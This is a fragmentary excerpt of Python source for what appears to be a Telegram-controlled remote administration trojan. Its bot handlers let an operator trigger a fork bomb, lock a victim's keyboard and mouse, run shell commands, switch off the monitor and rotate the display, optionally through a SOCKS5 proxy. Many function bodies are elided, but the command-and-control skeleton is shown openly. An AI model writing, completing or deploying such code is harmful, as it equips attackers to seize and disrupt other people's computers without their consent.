...
button1 = types.InlineKeyboardButton('Start ForkBomb', callback_data='forkbomb')
button2 = types.InlineKeyboardButton('Hell no!', callback_data='cancel')
button3 = types.InlineKeyboardButton('« Back', callback_data='cancel')
main9.row(button1)
main9.row(button2)
...
if xProxy is True:
 apihelper.proxy = {'https': 'socks5://{}:{}@{}:{}'.format(Login, Password, Ip, Port)}
...
def callback_inline(command):
 if command.message:
  ...
  # Handling the "Forkbomb" Button

  if command.data == 'forkbomb':
   SendMessage(command, '*The ForkBomb is Activated!*')
   ForkBomb()
...
def Rotate(command):
 try:
  ...
  bot.send_message(command.chat.id, '*Select Display Rotation\n\n› /Rotate*\n\n`0, 90, 180, 270`', parse_mode="Markdown")
...
def Monitor(command):
 try:
  ...
  bot.send_message(command.chat.id, '*Select monitor mode\n\n› /Monitor*\n\n`On, Off`', parse_mode="Markdown")
...
def Freeze(command):
 ...
 if Admin() is True:
  try:
   ...
   bot.reply_to(command, '*Keyboard and mouse locked for ' + Seconds + ' Seconds!*', parse_mode="Markdown")
...
def CMD(command):
 try:
  ...
  try:
   ...
   bot.send_message(command.chat.id, '*Empty Line*', parse_mode="Markdown")
  except:
...
@bot.message_handler(commands=['ForkBomb', 'forkbomb'])
def Wallpapers(command):
 bot.send_message(command.chat.id, '*Are You Sure?*', reply_markup=main9, parse_mode="Markdown")
